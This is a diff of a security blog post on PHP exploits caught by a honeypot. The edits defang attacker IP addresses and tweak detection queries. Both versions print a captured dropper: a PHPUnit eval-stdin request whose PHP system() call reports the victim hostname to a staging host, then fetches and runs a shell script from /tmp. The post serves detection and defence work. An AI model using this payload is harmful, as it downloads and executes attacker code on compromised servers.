@@ -117,7 +117,7 @@ ul,ol{max-width:82ch}li{margin:6px 0}
 <h1>Six Old PHP Exploits Still Sprayed Daily: How to Detect the Attempt, the Check and the Dropper</h1>
 <p>PHPUnit eval-stdin, ThinkPHP invokefunction, pearcmd, Laravel Ignition, PHP-CGI and the Apache traversal made up 585 requests to my honeypot. I break down the payloads, including a dropper that reports back at every stage, and give behavioural detections for Splunk + CrowdStrike and Sentinel + Defender for Endpoint.</p>
 <nav class="toc"><strong>Key Sections:</strong> What Hit the Server · The Attack, Step by Step · Pyramid of Pain · Web-Layer Detections · Endpoint Detections · When It Fires · Hardening · IOCs</nav>
-<p class="small">Part of my <a href="/blog/honeypot-detection-playbook/">honeypot detection series</a>. <span class="org orgA">Org A</span> runs Splunk with CrowdStrike Falcon. <span class="org orgB">Org B</span> runs Microsoft Sentinel with Defender for Endpoint. The web-layer KQL ran against the honeypot's real logs. The endpoint queries are written from the payloads shown here, so adapt the field names to your environment.</p>
+<p class="small">Part of my <a href="/blog/honeypot-detection-playbook/">honeypot detection series</a>. <span class="org orgA">Org A</span> runs Splunk with CrowdStrike Falcon. Its Falcon queries use Event Search field names; on raw FDR data, apply the <a href="/blog/honeypot-detection-playbook/#falcon">normalisation macro</a> first. <span class="org orgB">Org B</span> runs Microsoft Sentinel with Defender for Endpoint. The web-layer KQL ran against the honeypot's real logs. The endpoint queries are written from the payloads shown here, so adapt the field names to your environment.</p>
 
 <h2 id="what">1. What Hit the Server</h2>
 
@@ -158,22 +158,22 @@ ul,ol{max-width:82ch}li{margin:6px 0}
 </tbody></table>
 
 <h3><span class="kc">Delivery + C2</span> Step 3: A dropper with a conversion funnel</h3>
-<p>On 8 November, <code>195.178.110.78</code> skipped the check and sent this straight to PHPUnit:</p>
+<p>On 8 November, <code>195.178.110[.]78</code> skipped the check and sent this straight to PHPUnit:</p>
 <pre><code>POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
 Content-Type: text/plain
 
-&lt;?php system("(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/e/$(uname -n) &gt;/dev/null 2&gt;&amp;1);sleep 5;cd /tmp||cd /dev/shm;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/system/bin:/system/xbin:$PATH;(/bin/busybox wget -qO.y hxxp://77.239.124.167/s||wget -qO.y hxxp://77.239.124.167/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167/s);test -s .y||(/bin/busybox wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s);test -s .y&amp;&amp;((/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/f/$(uname -n) &gt;/dev/null 2&gt;&amp;1);/bin/sh .y||/system/bin/sh .y||sh .y||/bin/busybox sh .y||busybox sh .y;(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/r/$(uname -n) &gt;/dev/null 2&gt;&amp;1))||(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/n/$(uname -n) &gt;/dev/null 2&gt;&amp;1)"); ?&gt;</code></pre>
+&lt;?php system("(/bin/busybox wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/e/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/e/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124[.]167:8099/b/e/$(uname -n) &gt;/dev/null 2&gt;&amp;1);sleep 5;cd /tmp||cd /dev/shm;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/system/bin:/system/xbin:$PATH;(/bin/busybox wget -qO.y hxxp://77.239.124[.]167/s||wget -qO.y hxxp://77.239.124[.]167/s||curl -fsSL -m 8 -o.y hxxp://77.239.124[.]167/s);test -s .y||(/bin/busybox wget -qO.y hxxp://77.239.124[.]167:23413/k/a56f1a4933ad0bca/s||wget -qO.y hxxp://77.239.124[.]167:23413/k/a56f1a4933ad0bca/s||curl -fsSL -m 8 -o.y hxxp://77.239.124[.]167:23413/k/a56f1a4933ad0bca/s);test -s .y&amp;&amp;((/bin/busybox wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/f/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/f/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124[.]167:8099/b/f/$(uname -n) &gt;/dev/null 2&gt;&amp;1);/bin/sh .y||/system/bin/sh .y||sh .y||/bin/busybox sh .y||busybox sh .y;(/bin/busybox wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/r/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/r/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124[.]167:8099/b/r/$(uname -n) &gt;/dev/null 2&gt;&amp;1))||(/bin/busybox wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/n/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/n/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124[.]167:8099/b/n/$(uname -n) &gt;/dev/null 2&gt;&amp;1)"); ?&gt;</code></pre>
 <p>Laid out one step per line:</p>
-<pre><code>(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/e/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/e/$(uname -n) &gt;/dev/null 2&gt;&amp;1);
+<pre><code>(/bin/busybox wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/e/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/e/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124[.]167:8099/b/e/$(uname -n) &gt;/dev/null 2&gt;&amp;1);
 sleep 5;
 cd /tmp||cd /dev/shm;
 export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/system/bin:/system/xbin:$PATH;
-(/bin/busybox wget -qO.y hxxp://77.239.124.167/s||wget -qO.y hxxp://77.239.124.167/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167/s);
-test -s .y||(/bin/busybox wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||wget -qO.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s||curl -fsSL -m 8 -o.y hxxp://77.239.124.167:23413/k/a56f1a4933ad0bca/s);
-test -s .y&amp;&amp;((/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/f/$(uname -n) &gt;/dev/null 2&gt;&amp;1);
+(/bin/busybox wget -qO.y hxxp://77.239.124[.]167/s||wget -qO.y hxxp://77.239.124[.]167/s||curl -fsSL -m 8 -o.y hxxp://77.239.124[.]167/s);
+test -s .y||(/bin/busybox wget -qO.y hxxp://77.239.124[.]167:23413/k/a56f1a4933ad0bca/s||wget -qO.y hxxp://77.239.124[.]167:23413/k/a56f1a4933ad0bca/s||curl -fsSL -m 8 -o.y hxxp://77.239.124[.]167:23413/k/a56f1a4933ad0bca/s);
+test -s .y&amp;&amp;((/bin/busybox wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/f/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/f/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124[.]167:8099/b/f/$(uname -n) &gt;/dev/null 2&gt;&amp;1);
 /bin/sh .y||/system/bin/sh .y||sh .y||/bin/busybox sh .y||busybox sh .y;
-(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/r/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/r/$(uname -n) &gt;/dev/null 2&gt;&amp;1))||(/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124.167:8099/b/n/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124.167:8099/b/n/$(uname -n) &gt;/dev/null 2&gt;&amp;1)</code></pre>
+(/bin/busybox wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/r/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/r/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124[.]167:8099/b/r/$(uname -n) &gt;/dev/null 2&gt;&amp;1))||(/bin/busybox wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/n/$(uname -n)||wget -qO- -T 4 hxxp://77.239.124[.]167:8099/b/n/$(uname -n)||curl -fsSL -m 4 hxxp://77.239.124[.]167:8099/b/n/$(uname -n) &gt;/dev/null 2&gt;&amp;1)</code></pre>
 <p>The design is clever. Before downloading anything, it requests <code>/b/e/$(uname -n)</code> ("executed") with the victim's hostname in the URL. Then <code>/b/f/</code> (fetched), <code>/b/r/</code> (ran) or <code>/b/n/</code> (nothing worked). The operator's own web log becomes a dashboard showing every host where the exploit landed and how far it got (T1071.001). Every download is tried three ways (<code>busybox wget</code>, <code>wget</code>, <code>curl</code>), on two ports, and the <code>PATH</code> includes Android's <code>/system/bin</code>. It's built to run on anything from a cloud VM to a set-top box (T1105).</p>
 
 <h3><span class="kc">Installation</span> Step 4: Hidden script in /tmp</h3>
@@ -193,7 +193,7 @@ test -s .y&amp;&amp;((/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f
 <pre><code>let WebAccess = Syslog
 | where SyslogMessage startswith "php_http: "
 | extend j = parse_json(substring(SyslogMessage, 10))
-| project TimeGenerated, SrcIp = tostring(j.client), Method = tostring(j.method), Request = tostring(j.request),
+| project TimeGenerated, DestHost = Computer, SrcIp = tostring(j.client), Method = tostring(j.method), Request = tostring(j.request),
           Url = tostring(j.uri), Status = toint(j.status), BytesOut = toint(j.bytes_out),
           UserAgent = tostring(j.user_agent), ContentType = tostring(j.content_type), Body = tostring(j.body);</code></pre>
 
@@ -345,10 +345,10 @@ test -s .y&amp;&amp;((/bin/busybox wget -qO- -T 4 hxxp://77.239.124.167:8099/b/f
 
 <h2 id="iocs">8. IOCs</h2>
 <table><thead><tr><th>Type</th><th>Value</th><th>Seen in</th></tr></thead><tbody>
-<tr><td>Staging host</td><td><code>77.239.124[.]167</code> ports 80, 8099, 23413</td><td>PHPUnit and ThinkPHP dropper from <code>195.178.110.78</code></td></tr>
+<tr><td>Staging host</td><td><code>77.239.124[.]167</code> ports 80, 8099, 23413</td><td>PHPUnit and ThinkPHP dropper from <code>195.178.110[.]78</code></td></tr>
 <tr><td>URL paths</td><td><code>/b/e/</code>, <code>/b/f/</code>, <code>/b/r/</code>, <code>/b/n/</code> + hostname; <code>/s</code>; <code>/k/a56f1a4933ad0bca/s</code></td><td>Same</td></tr>
 <tr><td>File</td><td><code>.y</code> in <code>/tmp</code> or <code>/dev/shm</code></td><td>Same</td></tr>
-<tr><td>Callback</td><td><code>178.83.188[.]141:8880</code>, path <code>/t/&lt;24 hex&gt;</code></td><td>PHPUnit and Ignition from <code>92.118.39.92</code></td></tr>
+<tr><td>Callback</td><td><code>178.83.188[.]141:8880</code>, path <code>/t/&lt;24 hex&gt;</code></td><td>PHPUnit and Ignition from <code>92.118.39[.]92</code></td></tr>
 <tr><td>Canaries</td><td><code>SNIPPER_OK_</code>, <code>PAST</code> + 6 digits, <code>3306196588</code>, MD5 of <code>Hello PHPUnit</code> / <code>Hello</code> / <code>hi</code></td><td>Execution checks</td></tr>
 </tbody></table>
 <aside aria-label="Work with Global SOC" style="margin:40px 0 20px;padding:24px;border:1px solid #c8dce7;border-radius:12px;background:#e6f0f5;color:#142333"><h2 style="margin:0 0 12px">Have a project or security question?</h2><p>Talk to our Glen Waverley, Melbourne team about secure apps, DNS or email security.</p><a href="/#contact">Discuss your project with Global SOC &rarr;</a></aside></main>
